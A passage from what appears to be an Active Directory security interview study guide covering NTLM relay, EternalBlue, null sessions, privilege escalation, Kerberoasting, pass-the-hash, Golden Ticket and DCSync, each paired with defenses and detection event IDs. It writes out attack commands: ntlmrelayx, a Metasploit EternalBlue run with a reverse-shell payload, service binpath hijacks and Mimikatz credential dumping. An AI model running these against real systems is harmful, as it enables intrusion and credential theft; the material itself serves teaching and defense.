  │                        │  2. Relay Auth      │
  │                        │  (to target)        │
  │                        ├────────────────────►│
  │                        │                     │
  │                        │  3. Target accepts  │
  │                        │  (thinks it's victim)
  │                        │◄────────────────────┤
  │                        │                     │
  │                        │  4. Access target   │
  │                        │  as victim          │
  │                        ├────────────────────►│
```

**Attack Steps**:
```bash
# 1. Set up relay listener
impacket-ntlmrelayx -t 192.168.1.50 -smb2support

# 2. Trigger authentication from victim to attacker
# (Force victim to connect to attacker's IP)
# Methods:
# - Responder (LLMNR/NBT-NS poisoning)
# - Phishing link: file://attacker-ip/share
# - IPv6 DNS takeover

# 3. Relay authenticates to target
# If successful: Execute commands, dump SAM, etc.
```

**Requirements**:
- SMB signing disabled on target (or not required)
- Victim has admin on target

**Defense**:
```
✅ Enable SMB signing (required):
   Group Policy: Microsoft network server: Digitally sign communications (always)
✅ Disable NTLM (use Kerberos only)
✅ LLMNR/NBT-NS disabled
✅ Network segmentation (workstations can't talk to each other)
```

### 9.2 EternalBlue (MS17-010)

**Definition**: SMBv1 vulnerability allowing remote code execution.

**Famous Usage**: WannaCry ransomware (2017)

**Attack**:
```bash
# Check if vulnerable
nmap -p445 --script smb-vuln-ms17-010 192.168.1.10

# Exploit with Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# Result: SYSTEM shell on target
```

**Defense**:
```
✅ Patch MS17-010 (released March 2017)
✅ Disable SMBv1:
   Windows: Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
✅ Firewall: Block port 445 from internet
```

### 9.3 NULL Session

**Definition**: Anonymous connection to IPC$ share (legacy vulnerability).

**Attack**:
```bash
# Connect with null session (no username/password)
smbclient //192.168.1.10/IPC$ -N

# Enumerate users
rpcclient -U "" -N 192.168.1.10
rpcclient $> enumdomusers

# Enumerate shares
enum4linux -n 192.168.1.10
```

**Defense**:
```
✅ Disable null sessions:
   Network access: Do not allow anonymous enumeration of SAM accounts
   Network access: Do not allow anonymous enumeration of SAM accounts and shares
```

---

## 10. Windows Privilege Escalation

### 10.1 Common Techniques

**Unquoted Service Path**:
```
Vulnerable service:
C:\Program Files\Vulnerable Software\service.exe

Windows searches (in order):
1. C:\Program.exe
2. C:\Program Files\Vulnerable.exe
3. C:\Program Files\Vulnerable Software\service.exe

Exploit:
Place malicious "Program.exe" in C:\
When service restarts → C:\Program.exe runs as SYSTEM
```

**AlwaysInstallElevated**:
```
Registry check:
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1

Exploit:
msiexec /quiet /qn /i malicious.msi

MSI installer runs as SYSTEM
```

**Weak Service Permissions**:
```
Check service permissions:
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

Found: Service "VulnSvc" writable by Everyone

Exploit:
sc config VulnSvc binpath= "C:\Temp\malware.exe"
sc stop VulnSvc
sc start VulnSvc

Malware runs as SYSTEM
```

---

## 11. AD Security Best Practices

```
AUTHENTICATION:
✅ Enforce MFA for all admin accounts
✅ Use Protected Users group
✅ Disable NTLM (Kerberos only)
✅ Enable SMB signing (required)

ACCOUNTS:
✅ Use Managed Service Accounts (MSA/gMSA)
✅ Long, complex service account passwords (25+ chars)
✅ Least privilege (service accounts not in Domain Admins)
✅ Separate admin accounts (don't use same for workstation + servers)
✅ LAPS (unique local admin passwords per machine)

MONITORING:
✅ Monitor DCSync attempts (Event ID 4662)
✅ Alert on unusual Kerberos activity (Golden Ticket indicators)
✅ Monitor for AS-REP roasting (Event ID 4768)
✅ Alert on admin account usage from unusual locations

HARDENING:
✅ Tiered admin model (Tier 0: DCs, Tier 1: Servers, Tier 2: Workstations)
✅ Disable SMBv1
✅ Patch regularly (especially DCs)
✅ Network segmentation (workstations can't talk directly)
✅ Disable LLMNR/NBT-NS
```

---

## 12. Interview Questions & Answers

**Q: Explain Active Directory architecture.**
**A**: "Active Directory is organized hierarchically:
- **Forest**: Top level, contains one or more domains, shares schema
- **Domain**: Security boundary, contains users/computers/groups
- **Domain Controller (DC)**: Server hosting AD, stores NTDS.dit (all hashes), authenticates users
- **Organizational Units (OUs)**: Containers for organizing objects, can apply GPOs
- **Objects**: Users, computers, groups, contacts

Example: Corp (forest) → example.com (domain) → DC01 (domain controller) → OU=IT,OU=Users (organizational units) → john@example.com (user object)"

---

**Q: What's the difference between Kerberos and NTLM?**
**A**: 
"**Kerberos** (modern, default):
- Ticket-based authentication
- More secure (AES encryption)
- Mutual authentication (client and server verify each other)
- Faster (tickets reused)
- Resistant to Pass-the-Hash

**NTLM** (legacy):
- Challenge-response
- Weaker (MD4/MD5)
- No mutual authentication
- Slower
- Vulnerable to Pass-the-Hash and relay attacks

**When NTLM is used**: IP address instead of hostname, Kerberos unavailable, legacy applications

**Recommendation**: Disable NTLM where possible"

---

**Q: How do you check if you have SMB privileges?**
**A**: "Multiple methods:

**Linux**:
```bash
# List shares
smbclient -L //192.168.1.10 -U username

# Connect to share
smbclient //192.168.1.10/Finance -U username

# Check admin access across network
crackmapexec smb 192.168.1.0/24 -u admin -p password --shares
# Look for 'Pwn3d!' = admin access
```

**Windows**:
```cmd
# Try accessing administrative share
dir \\192.168.1.10\C$
# Success = local admin
# Access denied = not admin
```

**Privileges**:
- Can list files → READ
- Can upload files → WRITE  
- Can access C$ / ADMIN$ → LOCAL ADMIN"

---

**Q: What is Kerberoasting and how does it work?**
**A**: "Kerberoasting is an attack to obtain service account passwords:

**Process**:
1. Enumerate accounts with SPN (Service Principal Name)
2. Request service ticket for these accounts
3. Service ticket encrypted with service account's password hash
4. Crack ticket offline (no failed login attempts)
5. Obtain service account password

**Why dangerous**: If service account is Domain Admin and has weak password → domain compromised

**Defense**:
- Long, complex passwords for service accounts (25+ characters)
- Use Managed Service Accounts (gMSA) - auto-generated 128-char passwords
- Least privilege (service accounts shouldn't be Domain Admin)
- Monitor Event ID 4769 (service ticket requests)"

---

**Q: Explain Pass-the-Hash attack.**
**A**: "Pass-the-Hash uses NTLM hash instead of password to authenticate:

**How**:
1. Extract NTLM hash from compromised system (Mimikatz)
2. Use hash to authenticate to other systems (no cracking needed)
3. Access resources as that user

**Why it works**: NTLM uses hash for authentication, not password. Hash is the credential.

**Example**:
```
mimikatz # sekurlsa::logonpasswords
Found: Administrator NTLM hash: aad3b435...

mimikatz # sekurlsa::pth /user:Administrator /ntlm:aad3b435... /domain:example.com

Now authenticated as Administrator on other systems
```

**Defense**:
- Disable NTLM (use Kerberos only)
- Credential Guard (Windows 10/Server 2016+)
- Protected Users group
- LAPS (unique local admin passwords)"

---

**Q: What is a Golden Ticket attack?**
**A**: "Golden Ticket is a forged TGT (Ticket-Granting Ticket) granting access to anything in the domain:

**Requirements**: krbtgt account's NTLM hash (requires DC compromise)

**Impact**:
- Access any resource in domain
- Works for non-existent users
- Works even if account deleted or password changed
- Valid for years (attacker-controlled lifetime)

**Creation**:
```
mimikatz # kerberos::golden /domain:example.com /sid:S-1-5-21-... /rc4:<krbtgt_hash> /user:fakeadmin

Inject ticket → Full domain access
```

**Detection**:
- Event ID 4769 (Service ticket from unusual accounts)
- Tickets with suspicious properties (10-year lifetime)

**Remediation**: Change krbtgt password TWICE (current + history)"

---

**Q: Explain DCSync attack.**
**A**: "DCSync impersonates a Domain Controller to request password hashes:

**Process**:
1. Attacker has account with replication permissions (Domain Admin or custom)
2. Uses replication protocol to request hashes from DC
3. DC thinks it's replicating to another DC
4. Returns all password hashes

**Advantages over extracting NTDS.dit**:
- No need for DC access
- Uses legitimate protocol (harder to detect)
- Can be done remotely

**Command**:
```
mimikatz # lsadump::dcsync /domain:example.com /all
```

**Detection**: Event ID 4662 (Directory Service Access, DS-Replication-Get-Changes)

**Defense**: Restrict replication permissions, monitor Event ID 4662"

---

**Q: What are Group Policy Objects (GPOs)?**
**A**: "GPOs are centralized management of settings for AD users/computers:

**Use cases**:
- Password policies
- Security settings (firewall, antivirus)
- Software deployment
- Desktop configuration
- Logon scripts

**Processing order (LSDOU)**:
1. Local (computer's local policy)
2. Site
3. Domain
4. OU (most specific wins)

**Storage**: \\domain\SYSVOL\domain\Policies\{GUID}

**Security risk**: If attacker gains GPO edit rights, can deploy malware domain-wide via logon scripts or scheduled tasks"

---

**Q: What is the Windows Registry and its security implications?**
**A**: "Registry is hierarchical database storing Windows configuration:

**Main hives**:
- **HKLM** (Local Machine): System-wide settings, installed software
- **HKCU** (Current User): User preferences
- **HKU** (Users): All user profiles

**Security implications**:

**Password storage**:
- SAM hive contains local user NTLM hashes
- Requires SYSTEM access to extract

**Persistence**:
- Malware uses Run keys for autostart:
  - HKLM\Software\Microsoft\Windows\CurrentVersion\Run
  - HKCU\Software\Microsoft\Windows\CurrentVersion\Run

**Forensics**:
- Recent files, typed URLs, USB devices, network shares
- Registry key Last Write Time = modification timestamp"

---

**Q: What are common AD attacks you should monitor for?**
**A**: "Key attacks and detection:

**Kerberoasting**:
- Monitor: Event ID 4769 (service ticket requests) for sensitive accounts
- Alert: Multiple service ticket requests in short time

**AS-REP Roasting**:
- Monitor: Accounts with 'Do not require Kerberos preauthentication'
- Alert: Event ID 4768 without preceding preauth

**Pass-the-Hash**:
- Monitor: NTLM authentication from unusual sources
- Alert: Same hash used from multiple IPs

**DCSync**:
- Monitor: Event ID 4662 (Directory Service Access)
- Alert: Replication requests from non-DC computers

**Golden Ticket**:
- Monitor: Event ID 4769 with unusual properties
- Alert: Tickets with 10-year lifetime or non-existent users

**Password Spraying**:
- Monitor: Event ID 4625 (failed logins)
- Alert: Single IP, many failed logins across different accounts"

---

## Quick Reference

**AD Components**:
```
Forest > Domain > DC > OU > Objects (Users, Computers, Groups)
```

**Authentication**:
```
Kerberos: Ticket-based (modern, secure)
NTLM: Challenge-response (legacy, vulnerable)
```

**Key Attacks**:
```
Kerberoasting: Crack service account passwords offline
Pass-the-Hash: Use hash instead of password
Golden Ticket: Forged TGT (full domain access)
DCSync: Request all hashes from DC
```

**SMB**:
```
Port: 445 (SMB), 139 (NetBIOS)
Versions: SMBv1 (disable!), SMBv2/v3 (use)
Admin shares: C$, ADMIN$, IPC$
```

**Privilege Checking**:
```
crackmapexec smb IP -u user -p pass --shares
smbclient //IP/Share -U user
```

**Registry Hives**:
```
HKLM: Machine-wide (C:\Windows\System32\config\)
HKCU: Current user (C:\Users\<user>\NTUSER.DAT)
```

**Good luck with your interview!** 🎯

You now have comprehensive knowledge of Active Directory, Windows systems, SMB protocol, attacks, and defensive measures!
